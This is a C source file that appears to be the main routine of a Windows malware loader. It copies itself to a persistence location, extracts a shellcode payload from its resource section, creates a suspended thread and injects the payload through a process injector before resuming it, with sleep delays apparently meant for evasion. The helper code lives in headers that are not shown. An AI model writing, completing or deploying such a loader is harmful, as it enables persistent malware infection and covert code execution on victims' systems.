#include <Windows.h>
#include <stdio.h>
#include "persistence.h"
#include "payload.h"
#include "injector.h"
#include "ThreadLocal.h"

#pragma warning(disable:4996)
int main() {

	// Persistence ON
	Sleep(10000);
	if (!CopyMalwareToPersistence()){
		printf("Error Persistence...");
		return -1;
	}
	
	Sleep(10000);

	// Retrieve Payload of .rsrc section
	PVOID ShellPayload = NULL;
	SIZE_T SizePayload = 0;
	if (!GetPayloadRSRC(&ShellPayload, &SizePayload)) {
		printf("Error To Retrieve Payload");
		return -1;
	}

	printf("[+] Payload OK - Size: %zu\n", SizePayload);

	// ThreadLocal
	HANDLE hThread = NULL;
	if (!CreateThreadInoffensive(&hThread)) {
		printf("Error To Create Thread suspended");
		return -1;
	}

	printf("[+] Thread OK\n");


	// Process Injection 
	if (!ProcessInjector(ShellPayload, SizePayload, &hThread)) {
		printf("Error ProcessInjector");
		return FALSE;
	}

	printf("[+] Injector OK\n");


	// Resume execute thread
	ResumeThread(hThread);
	printf("[+] Thread resumed\n");

	WaitForSingleObject(hThread, INFINITE);
	HeapFree(GetProcessHeap(), 0, ShellPayload);

	return 0;
}